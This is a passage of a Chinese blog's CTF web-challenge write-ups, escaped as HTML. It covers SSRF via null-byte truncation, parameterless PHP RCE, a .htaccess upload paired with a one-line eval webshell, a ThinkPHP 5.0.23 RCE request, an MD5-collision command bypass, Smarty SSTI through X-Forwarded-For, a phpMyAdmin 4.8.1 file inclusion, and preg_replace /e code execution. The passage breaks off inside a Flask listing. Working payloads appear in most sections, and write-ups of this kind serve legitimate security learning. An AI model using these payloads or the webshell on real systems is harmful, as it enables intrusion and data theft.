&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Login&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Download&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Flag&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;/web-app&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意到了一个&lt;code&gt;FlagController&lt;/code&gt;的控制器，它所在的类为&lt;code&gt;com.wm.ctf.FlagController&lt;/code&gt;，前面也提到了编译文件所在的文件夹&lt;code&gt;/WEB-INF/classes/&lt;/code&gt;，去这个文件夹下载&lt;code&gt;FlagController&lt;/code&gt;相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;class文件源码好多不可见字符&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310112205.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我选中的那段就是flag在的地方，看到了&lt;code&gt;==&lt;/code&gt;就应该意识到是base64编码，但是base64编码里没有&lt;code&gt;&amp;lt;&lt;/code&gt;这个字符，所以flag的密文就是&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="以下部分施工中"&gt;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;以下部分施工中👷‍♂️&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;
&lt;/h1&gt;&lt;p&gt;下面的都是没有整理，先把重要思路写下来了，然后有时间再配图&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gkctf2020cve版签到"&gt;[GKCTF2020]cve版签到
&lt;/h1&gt;&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/qq_45521281/article/details/106425266" target="_blank" rel="noopener"
&gt;CVE-2020-7066&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;只有一个按钮，点击以后查看网页的Network请求中有一个&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hint: Flag in localhost&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You just view *.ctfhub.com&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?url=http://127.0.0.1%00.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第二个提示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Host must be end with &amp;lsquo;123&amp;rsquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;必须以123结尾，所以最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?url=http://127.0.0.123%00.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="gxyctf2019禁止套娃"&gt;[GXYCTF2019]禁止套娃
&lt;/h1&gt;&lt;p&gt;git泄露。我使用的https://github.com/gakki429/Git_Extract&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#34;flag.php&amp;#34;;
echo &amp;#34;flag在哪里呢？&amp;lt;br&amp;gt;&amp;#34;;
if(isset($_GET[&amp;#39;exp&amp;#39;])){
if (!preg_match(&amp;#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&amp;#39;, $_GET[&amp;#39;exp&amp;#39;])) {
if(&amp;#39;;&amp;#39; === preg_replace(&amp;#39;/[a-z,_]+\((?R)?\)/&amp;#39;, NULL, $_GET[&amp;#39;exp&amp;#39;])) {
if (!preg_match(&amp;#39;/et|na|info|dec|bin|hex|oct|pi|log/i&amp;#39;, $_GET[&amp;#39;exp&amp;#39;])) {
// echo $_GET[&amp;#39;exp&amp;#39;];
@eval($_GET[&amp;#39;exp&amp;#39;]);
}
else{
die(&amp;#34;还差一点哦！&amp;#34;);
}
}
else{
die(&amp;#34;再好好想想！&amp;#34;);
}
}
else{
die(&amp;#34;还想读flag，臭弟弟！&amp;#34;);
}
}
// highlight_file(__FILE__);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正则表达式匹配的只有函数的形式如&lt;code&gt;var_dump();&lt;/code&gt;是一道&lt;a class="link" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener"
&gt;无参数RCE&lt;/a&gt;，看的题解自己整理的payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一层一层解释：&lt;/p&gt;
&lt;p&gt;localeconv() 函数返回一包含本地数字及货币格式信息的数组&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图片展示&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;current() 返回数组中的当前单元, 默认取第一个值。别名pos()&lt;/p&gt;
&lt;p&gt;到这里获得的是一个点&lt;/p&gt;
&lt;p&gt;scandir() 遍历目录，是&lt;code&gt;.&lt;/code&gt;的话就是列出当前目录。&lt;/p&gt;
&lt;p&gt;此时输出：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;array(5) { [0]=&amp;gt; string(1) &amp;#34;.&amp;#34; [1]=&amp;gt; string(2) &amp;#34;..&amp;#34; [2]=&amp;gt; string(4) &amp;#34;.git&amp;#34; [3]=&amp;gt; string(8) &amp;#34;flag.php&amp;#34; [4]=&amp;gt; string(9) &amp;#34;index.php&amp;#34; }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时的输出还是键值对的形式，我们需要使用&lt;code&gt;array_flip()&lt;/code&gt;函数交换键值对，然后使用随机函数&lt;code&gt;array_rand()&lt;/code&gt;从数组中随机取出一个或多个单元。因为正则的原因无法使用&lt;code&gt;file_get_contents()&lt;/code&gt;，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gxyctf2019babyupload"&gt;[GXYCTF2019]BabyUpload
&lt;/h1&gt;&lt;p&gt;ph过滤，image/gif不能通过。image/jpe可以&lt;/p&gt;
&lt;p&gt;上传.htaccess&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传码，但是不能是php代码，使用js&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_REQUEST[shell])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完工&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf-2ndold-hack"&gt;[BJDCTF 2nd]old-hack
&lt;/h1&gt;&lt;p&gt;ThinkPHP的&lt;a class="link" href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener"
&gt;漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ThinkPHP5 5.0.23&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=cat /flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="安洵杯-2019easy_web"&gt;[安洵杯 2019]easy_web
&lt;/h1&gt;&lt;p&gt;看url一个img和cmd，页面中有一个图片的标签，和一个&lt;strong&gt;md5 is funny ~&lt;/strong&gt;。把url中img的值进行解码发现图片名为&lt;code&gt;555.png&lt;/code&gt;，尝试用同样的编码方式读取index.php，加密的编码依次为：hex&amp;ndash;&amp;gt;base64&amp;ndash;&amp;gt;base64。&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&amp;#39;content-type:text/html;charset=utf-8&amp;#39;);
$cmd = $_GET[&amp;#39;cmd&amp;#39;];
if (!isset($_GET[&amp;#39;img&amp;#39;]) || !isset($_GET[&amp;#39;cmd&amp;#39;]))
header(&amp;#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;amp;cmd=&amp;#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&amp;#39;img&amp;#39;])));
$file = preg_replace(&amp;#34;/[^a-zA-Z0-9.]+/&amp;#34;, &amp;#34;&amp;#34;, $file);
if (preg_match(&amp;#34;/flag/i&amp;#34;, $file)) {
echo &amp;#39;&amp;lt;img src =&amp;#34;./ctf3.jpeg&amp;#34;&amp;gt;&amp;#39;;
die(&amp;#34;xixi～ no flag&amp;#34;);
} else {
$txt = base64_encode(file_get_contents($file));
echo &amp;#34;&amp;lt;img src=&amp;#39;data:image/gif;base64,&amp;#34; . $txt . &amp;#34;&amp;#39;&amp;gt;&amp;lt;/img&amp;gt;&amp;#34;;
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
}
echo $cmd;
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
if (preg_match(&amp;#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&amp;#39;|\&amp;#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&amp;lt;|&amp;gt;/i&amp;#34;, $cmd)) {
echo(&amp;#34;forbid ~&amp;#34;);
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
} else {
if ((string)$_POST[&amp;#39;a&amp;#39;] !== (string)$_POST[&amp;#39;b&amp;#39;] &amp;amp;&amp;amp; md5($_POST[&amp;#39;a&amp;#39;]) === md5($_POST[&amp;#39;b&amp;#39;])) {
echo `$cmd`;
} else {
echo (&amp;#34;md5 is funny ~&amp;#34;);
}
}
?&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;style&amp;gt;
body{
background:url(./bj.png) no-repeat center center;
background-size:cover;
background-attachment:fixed;
background-color:#CCCCCC;
}
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我不知道为什么，我的bp一定要在&lt;code&gt;&amp;amp;&lt;/code&gt;前加一个空格才可以通过。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?cmd=uniq%20/flag
POST
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&amp;amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读文件的绕过有&lt;/p&gt;
&lt;blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style="text-align: center"&gt;1&lt;/th&gt;
&lt;th&gt;more:一页一页的显示档案内容&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;2&lt;/td&gt;
&lt;td&gt;less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;3&lt;/td&gt;
&lt;td&gt;head:查看头几行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;4&lt;/td&gt;
&lt;td&gt;tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;5&lt;/td&gt;
&lt;td&gt;tail:查看尾几行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;6&lt;/td&gt;
&lt;td&gt;nl：显示的时候，顺便输出行号&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;7&lt;/td&gt;
&lt;td&gt;od:以二进制的方式读取档案内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;8&lt;/td&gt;
&lt;td&gt;vi:一种编辑器，这个也可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;9&lt;/td&gt;
&lt;td&gt;vim:一种编辑器，这个也可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;10&lt;/td&gt;
&lt;td&gt;sort:可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;11&lt;/td&gt;
&lt;td&gt;uniq:可以查看&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style="text-align: center"&gt;12&lt;/td&gt;
&lt;td&gt;file -f:报错出具体内容&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/blockquote&gt;
&lt;p&gt;摘自&lt;a class="link" href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener"
&gt;命令执行漏洞利用及绕过方式总结&lt;/a&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020mark-loves-cat"&gt;[BJDCTF2020]Mark loves cat
&lt;/h1&gt;&lt;p&gt;git泄露&lt;/p&gt;
&lt;p&gt;flag.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$flag = file_get_contents(&amp;#39;/flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;flag.php&amp;#39;;
$yds = &amp;#34;dog&amp;#34;;
$is = &amp;#34;cat&amp;#34;;
$handsome = &amp;#39;yds&amp;#39;;
foreach($_POST as $x =&amp;gt; $y){
$$x = $y;
}
foreach($_GET as $x =&amp;gt; $y){
$$x = $$y;
}
foreach($_GET as $x =&amp;gt; $y){
if($_GET[&amp;#39;flag&amp;#39;] === $x &amp;amp;&amp;amp; $x !== &amp;#39;flag&amp;#39;){
exit($handsome);
}
}
if(!isset($_GET[&amp;#39;flag&amp;#39;]) &amp;amp;&amp;amp; !isset($_POST[&amp;#39;flag&amp;#39;])){
exit($yds);
}
if($_POST[&amp;#39;flag&amp;#39;] === &amp;#39;flag&amp;#39; || $_GET[&amp;#39;flag&amp;#39;] === &amp;#39;flag&amp;#39;){
exit($is);
}
echo &amp;#34;the flag is: &amp;#34;.$flag;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;尝试输出&lt;code&gt;$flag&lt;/code&gt;即可。exit()函数退出时也会输出。&lt;/p&gt;
&lt;p&gt;第一个不可能实现，如果POST或GET传入flag的话必然导致&lt;code&gt;$flag&lt;/code&gt;修改，那么正好符合第二个if。&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GET
?yds=flag
POST(任意，但是需要保证不传flag)
is=233flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="bjdctf2020the-mystery-of-ip"&gt;[BJDCTF2020]The mystery of ip
&lt;/h1&gt;&lt;p&gt;hint.php里面有注释&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do you know why i know your ip?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。&lt;/p&gt;
&lt;p&gt;尝试了几个ssti的payload不行，但是提示了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Uncaught &amp;ndash;&amp;gt; Smarty Compiler:&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;请求：
X-Forwarded-For: {system(&amp;#39;cat /flag&amp;#39;)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a class="link" href="https://github.com/epinna/tplmap" target="_blank" rel="noopener"
&gt;SSTI神器–Tplmap&lt;/a&gt;，看介绍是和sqlmap差不多的工具。&lt;/p&gt;
&lt;p&gt;这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener"
&gt;CTF SSTI(服务器模板注入)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/3679/" target="_blank" rel="noopener"
&gt;flask之ssti模版注入从零到入门&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gwctf-2019我有一个数据库"&gt;[GWCTF 2019]我有一个数据库
&lt;/h1&gt;&lt;p&gt;页面是乱码，想知道内容了可以看下图&lt;/p&gt;
&lt;p&gt;$$各种乱码图&lt;/p&gt;
&lt;p&gt;对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存&amp;ndash;&amp;gt;GBK，再通过编码打开&amp;ndash;&amp;gt;UTF-8。内容如下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我有一个数据库，但里面什么也没有~
不信你找&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.secpulse.com/archives/72817.html" target="_blank" rel="noopener"
&gt;phpmyadmin4.8.1后台getshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="20210301"&gt;2021.03.01
&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id="bjdctf2020zjctf不过如此"&gt;[BJDCTF2020]ZJCTF，不过如此
&lt;/h1&gt;&lt;p&gt;绕过&lt;/p&gt;
&lt;p&gt;第一层用php伪协议中的data封装流。&lt;a class="link" href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener"
&gt;PHP伪协议总结&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,I have a dream&amp;amp;file=php://filter/convert.base64-encode/resource=next.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;读出来的next.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;base64解码：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$id = $_GET[&amp;#39;id&amp;#39;];
$_SESSION[&amp;#39;id&amp;#39;] = $id;
function complex($re, $str) {
return preg_replace(
&amp;#39;/(&amp;#39; . $re . &amp;#39;)/ei&amp;#39;,
&amp;#39;strtolower(&amp;#34;\\1&amp;#34;)&amp;#39;,
$str
);
}
foreach($_GET as $re =&amp;gt; $str) {
echo complex($re, $str). &amp;#34;\n&amp;#34;;
}
function getFlag(){
@eval($_GET[&amp;#39;cmd&amp;#39;]);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里想要通过需要知道一个&lt;a class="link" href="http://www.xinyueseo.com/websecurity/158.html" target="_blank" rel="noopener"
&gt;深入研究 preg_replace /e 模式下的代码漏洞问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;next.php?\S*=${getFlag()}&amp;amp;cmd=system(&amp;#39;cat /flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="de1ctf-2019ssrf-me"&gt;[De1CTF 2019]SSRF Me
&lt;/h1&gt;&lt;p&gt;进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#! /usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# encoding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Flask
